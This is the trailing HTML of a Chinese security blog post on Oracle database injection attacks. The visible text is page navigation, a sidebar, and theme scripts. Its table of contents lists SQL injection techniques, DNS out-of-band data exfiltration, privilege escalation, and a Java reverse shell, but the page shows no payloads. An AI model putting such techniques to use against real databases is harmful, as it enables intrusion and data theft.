data-image="/img/cover/oracle.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/6daae3c4.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/mssql.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQLServer数据库注入攻击方式</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/1f3ac757.html" title="SQL注入的原理"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/sql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">SQL注入的原理</div></div></a></div><div><a href="/post/724e6336.html" title="SQL注入分类"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/sql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">SQL注入分类</div></div></a></div><div><a href="/post/c2f49bfa.html" title="MySQL数据库注入攻击方式"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">MySQL数据库注入攻击方式</div></div></a></div><div><a href="/post/d3a798c0.html" title="Access数据库注入攻击方式"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/access.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">Access数据库注入攻击方式</div></div></a></div><div><a href="/post/6daae3c4.html" title="SQLServer数据库注入攻击方式"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/mssql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">SQLServer数据库注入攻击方式</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">Oracle数据库的基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Oracle数据库介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E6%9D%83%E9%99%90%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">Oracle权限分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">系统权限管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">实体权限管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E8%A7%92%E8%89%B2"><span class="toc-number">1.2.3.</span> <span class="toc-text">管理角色</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PL-SQL%E8%AF%AD%E8%A8%80"><span class="toc-number">1.3.</span> <span class="toc-text">PL&#x2F;SQL语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%9C%80%E6%B3%A8%E6%84%8F%E7%9A%84%E8%A7%84%E5%88%99"><span class="toc-number">1.4.</span> <span class="toc-text">SQL注入需注意的规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.5.</span> <span class="toc-text">实验环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">判断查询列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">2.2.</span> <span class="toc-text">判断回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.3.</span> <span class="toc-text">获取数据库基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">2.4.</span> <span class="toc-text">获取用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.6.</span> <span class="toc-text">获取字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">2.7.</span> <span class="toc-text">获取数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#utl-inaddr-get-host-name-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">utl_inaddr.get_host_name()函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctxsys-drithsx-sn-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">ctxsys.drithsx.sn()函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-xdb-version-checkin-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">dbms_xdb_version.checkin()函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-xdb-version-makeversioned-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">dbms_xdb_version.makeversioned()函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-xdb-version-uncheckout-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.5.</span> <span class="toc-text">dbms_xdb_version.uncheckout()函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-utility-sqlid-to-sqlhash-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.</span> <span class="toc-text">dbms_utility.sqlid_to_sqlhash()函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ordsys-ord-dicom-getmappingxpath-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.7.</span> <span class="toc-text">ordsys.ord_dicom.getmappingxpath()函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLType-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.8.</span> <span class="toc-text">XMLType()函数报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">布尔型盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-%E5%87%BD%E6%95%B0%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.1.</span> <span class="toc-text">decode()函数布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#instr-%E5%87%BD%E6%95%B0%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">instr()函数布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substr-%E5%87%BD%E6%95%B0%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.3.</span> <span class="toc-text">substr()函数布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">时间型盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-pipe-receive-message-%E5%87%BD%E6%95%B0%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.1.</span> <span class="toc-text">dbms_pipe.receive_message()函数时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-%E5%87%BD%E6%95%B0%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.2.</span> <span class="toc-text">decode()函数时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-%E4%B8%8Edbms-pipe-receive-message-%E5%B5%8C%E5%A5%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.3.</span> <span class="toc-text">decode()与dbms_pipe.receive_message()嵌套时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%B8%A6%E5%A4%96%E9%80%9A%E4%BF%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">DNS带外通信注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E6%94%AF%E6%8C%81utl-http-request"><span class="toc-number">6.1.</span> <span class="toc-text">检测是否支持utl_http.request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">6.2.</span> <span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">利用漏洞提权执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-export-extension"><span class="toc-number">7.1.</span> <span class="toc-text">dbms_export_extension()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-number">7.1.1.</span> <span class="toc-text">提升权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Java%E6%89%A7%E8%A1%8C"><span class="toc-number">7.1.2.</span> <span class="toc-text">使用Java执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-xmlquery-newcontext"><span class="toc-number">7.2.</span> <span class="toc-text">dbms_xmlquery.newcontext()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-java-test-funcall"><span class="toc-number">7.3.</span> <span class="toc-text">dbms_java_test.funcall()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">8.</span> <span class="toc-text">Java反弹Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91payload"><span class="toc-number">8.1.</span> <span class="toc-text">编译payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Java%E6%89%A7%E8%A1%8C-1"><span class="toc-number">8.2.</span> <span class="toc-text">使用Java执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">8.3.</span> <span class="toc-text">反弹shell</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/ec74cb90.html" title="Oracle数据库注入攻击方式"><img src="/img/gif/loading4.gif" data-original="/img/cover/oracle.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Oracle数据库注入攻击方式"/></a><div class="content"><a class="title" href="/post/ec74cb90.html" title="Oracle数据库注入攻击方式">Oracle数据库注入攻击方式</a><time datetime="2021-10-05T16:43:39.000Z" title="发表于 2021-10-06 00:43:39">2021-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/6daae3c4.html" title="SQLServer数据库注入攻击方式"><img src="/img/gif/loading4.gif" data-original="/img/cover/mssql.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQLServer数据库注入攻击方式"/></a><div class="content"><a class="title" href="/post/6daae3c4.html" title="SQLServer数据库注入攻击方式">SQLServer数据库注入攻击方式</a><time datetime="2021-10-05T16:43:38.000Z" title="发表于 2021-10-06 00:43:38">2021-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d3a798c0.html" title="Access数据库注入攻击方式"><img src="/img/gif/loading4.gif" data-original="/img/cover/access.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Access数据库注入攻击方式"/></a><div class="content"><a class="title" href="/post/d3a798c0.html" title="Access数据库注入攻击方式">Access数据库注入攻击方式</a><time datetime="2021-10-05T16:43:37.000Z" title="发表于 2021-10-06 00:43:37">2021-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/c2f49bfa.html" title="MySQL数据库注入攻击方式"><img src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MySQL数据库注入攻击方式"/></a><div class="content"><a class="title" href="/post/c2f49bfa.html" title="MySQL数据库注入攻击方式">MySQL数据库注入攻击方式</a><time datetime="2021-10-05T16:43:36.000Z" title="发表于 2021-10-06 00:43:36">2021-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/724e6336.html" title="SQL注入分类"><img src="/img/gif/loading4.gif" data-original="/img/cover/sql.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入分类"/></a><div class="content"><a class="title" href="/post/724e6336.html" title="SQL注入分类">SQL注入分类</a><time datetime="2021-10-05T16:43:35.000Z" title="发表于 2021-10-06 00:43:35">2021-10-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/smooth-scrolling.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_injector_config();
  }
  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7544e3e7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/google.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-05</span><a class="blog-slider__title" href="post/7544e3e7.html" alt="">开源情报与搜索引擎</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/7544e3e7.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/6daae3c4.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mssql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/6daae3c4.html" alt="">SQLServer数据库注入攻击方式</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/6daae3c4.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/ec74cb90.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/oracle.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/ec74cb90.html" alt="">Oracle数据库注入攻击方式</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/ec74cb90.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>